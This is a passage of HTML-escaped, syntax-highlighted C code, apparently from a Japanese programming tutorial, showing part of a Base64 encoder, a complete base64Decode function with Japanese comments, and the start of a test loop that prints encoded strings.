            &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;cursor&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; base64_spec&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;table&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x30&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x0f&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;cursor&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; base64_spec&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;table&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x3c&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;6&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x03&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;cursor&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; base64_spec&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;table&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x3f&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;cursor &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; base64&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;base64Decode&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;base64&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;retSize&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; BASE64_TYPE type&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    BASE64_SPEC base64_spec&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; table&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x80&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token class-name&quot;&gt;size_t&lt;/span&gt; length&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;cursor&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; i&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; j&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;base64 &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token constant&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token constant&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;token comment&quot;&gt;// base64_specの初期化&lt;/span&gt;
    base64_spec &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; BASE64_SPECS&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;i &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;BASE64_SPECS_LENGTH&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;BASE64_SPECS&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;type &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; type&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; 
        &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
            base64_spec &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; BASE64_SPECS&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;token comment&quot;&gt;// デコードするBase64文字列用のメモリ領域の確保&lt;/span&gt;
    length &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;base64&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    data &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;length &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;data &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token constant&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token constant&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;token function&quot;&gt;memset&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;table&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x80&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;table&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;i &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; BASE64_TABLE_LENGTH&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        table&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;base64_spec&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;table&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x7f&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; i&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

    cursor &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; data&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;i &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; j &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;length&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; j &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; ch&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;base64&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; base64_spec&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;pad&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
        ch &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; table&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;base64&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x7f&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;ch &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x80&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;token keyword&quot;&gt;continue&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;j &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;cursor &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; ch &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xfc&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;j &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;cursor&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|=&lt;/span&gt; ch &lt;span class=&quot;token operator&quot;&gt;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x03&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;cursor &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; ch &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xf0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;j &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;cursor&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|=&lt;/span&gt; ch &lt;span class=&quot;token operator&quot;&gt;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x0f&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;cursor &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; ch &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;6&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xc0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;cursor&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|=&lt;/span&gt; ch &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x3f&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;cursor &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;retSize &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; cursor &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt; data&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; data&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; i&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;i &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;BASE64_TESTS_LENGTH&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        BASE64_TEST test&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;base64&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;size_t&lt;/span&gt; size&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

        test &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; BASE64_TESTS&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

        base64 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;base64Encode&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;test&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; test&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;size&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; test&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;type&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;BASE64(\&quot;%s\&quot;) = \&quot;%s\&quot;\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; test&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; base64&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
